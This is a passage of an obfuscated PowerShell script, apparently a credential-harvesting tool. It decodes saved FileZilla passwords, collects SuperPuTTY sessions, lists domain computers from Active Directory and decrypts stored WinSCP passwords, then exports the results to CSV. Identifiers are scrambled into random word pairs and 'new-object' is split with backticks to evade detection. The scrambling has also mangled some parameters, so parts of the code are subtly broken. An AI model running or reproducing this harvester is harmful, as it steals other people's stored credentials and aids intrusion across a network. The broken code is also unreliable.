      }

    # Create object from collected data, excluding some trivial information
    [void]$CopyComb.Add((ne`w`-`ob`je`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  
  # base64_decode the stored encoded session passwords, and decode protocol
  foreach ($WearyLast in $CopyComb) {
      $WearyLast.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($WearyLast.Password))
      if ($WearyLast.Protocol -eq "0") {
        $WearyLast.Protocol = "Use FTP over TLS if available"
      } elseif ($WearyLast.Protocol -eq 1) {
        $WearyLast.Protocol = "Use SFTP"
      } elseif ($WearyLast.Protocol -eq 3) {
        $WearyLast.Protocol = "Require implicit FTP over TLS"
      } elseif ($WearyLast.Protocol -eq 4) {
        $WearyLast.Protocol = "Require explicit FTP over TLS"
      } elseif ($WearyLast.Protocol -eq 6) {
        $WearyLast.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($TwistGreet) {
    $CopyComb | Export-CSV -Append -Path ($HugStick + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $CopyComb | Format-List | Out-String
  }

  # Add the array of FileZilla session objects to the target user object
  $DuckMint | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -TeenyQuince $CopyComb

} # ProcessFileZillaFile

function ProcessSuperPuTTYFile($SpicyCruel) {

  foreach($PackKnot in $SpicyCruel.ArrayOfSessionData.SessionData) {

    foreach ($NestCure in $PackKnot) { 
      if ($NestCure -ne $null) {

        $JudgeEnjoy = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $JudgeEnjoy."Source" = $TicketFear
        $JudgeEnjoy."SessionId" = $NestCure.SessionId
        $JudgeEnjoy."SessionName" = $NestCure.SessionName
        $JudgeEnjoy."Host" = $NestCure.Host
        $JudgeEnjoy."Username" = $NestCure.Username
        $JudgeEnjoy."ExtraArgs" = $NestCure.ExtraArgs
        $JudgeEnjoy."Port" = $NestCure.Port
        $JudgeEnjoy."PuTTY Session" = $NestCure.PuttySession

        [void]$StopPlug.Add($JudgeEnjoy)
      } 
    }

  } # ForEach SuperPuTTYSessions

  if ($TwistGreet) {
    $StopPlug | Export-CSV -Append -Path ($HugStick + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $StopPlug | Out-String
  }

  # Add the array of SuperPuTTY session objects to the target user object
  $DuckMint | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -TeenyQuince $StopPlug

} # ProcessSuperPuTTYFile

####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

# Gets all domain-joined computer names and properties in one object
function GetComputersFromActiveDirectory {

  $QuickTravel = "computer"
  $NuttySigh = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry
  $ProseServe = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher
  $ProseServe.SearchRoot = $NuttySigh
  $ProseServe.Filter = ("(objectCategory=$QuickTravel)")

  $SleepyGroan = "name"

  foreach ($MeatThin in $SleepyGroan){$ProseServe.PropertiesToLoad.Add($MeatThin)}

  return $ProseServe.FindAll()

}

function DecryptNextCharacterWinSCP($TwigWacky) {

  # Creates an object with flag and remainingPass properties
  $KindlyAcidic = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $ExistWoozy = ("0123456789ABCDEF".indexOf($TwigWacky[0]) * 16)
  $SneezeMen = "0123456789ABCDEF".indexOf($TwigWacky[1])

  $TrailStare = $ExistWoozy + $SneezeMen

  $WaryMilk = (((-bnot ($TrailStare -bxor $SelfStore)) % 256) + 256) % 256

  $KindlyAcidic.flag = $WaryMilk
  $KindlyAcidic.remainingPass = $TwigWacky.Substring(2)

  return $KindlyAcidic

}

function DecryptWinSCPPassword($SkirtStingy, $TrapCurl, $AbsurdPorter) {

  $SkateMushy = 255
  $SelfStore = 163

  $CakeShake = 0
  $TurnArrive =  $SkirtStingy + $TrapCurl
  $ExpandHard = DecryptNextCharacterWinSCP($AbsurdPorter)

  $BlackWine = $ExpandHard.flag 

  if ($ExpandHard.flag -eq $SkateMushy) {
    $ExpandHard.remainingPass = $ExpandHard.remainingPass.Substring(2)
    $ExpandHard = DecryptNextCharacterWinSCP($ExpandHard.remainingPass)
  }

  $CakeShake = $ExpandHard.flag

  $ExpandHard = DecryptNextCharacterWinSCP($ExpandHard.remainingPass)
  $ExpandHard.remainingPass = $ExpandHard.remainingPass.Substring(($ExpandHard.flag * 2))

  $BurnPower = ""
  for ($MeatThin=0; $MeatThin -lt $CakeShake; $MeatThin++) {
    $ExpandHard = (DecryptNextCharacterWinSCP($ExpandHard.remainingPass))
    $BurnPower += [char]$ExpandHard.flag
  }

  if ($BlackWine -eq $SkateMushy) {
    return $BurnPower.Substring($TurnArrive.length)
  }

  return $BurnPower

}
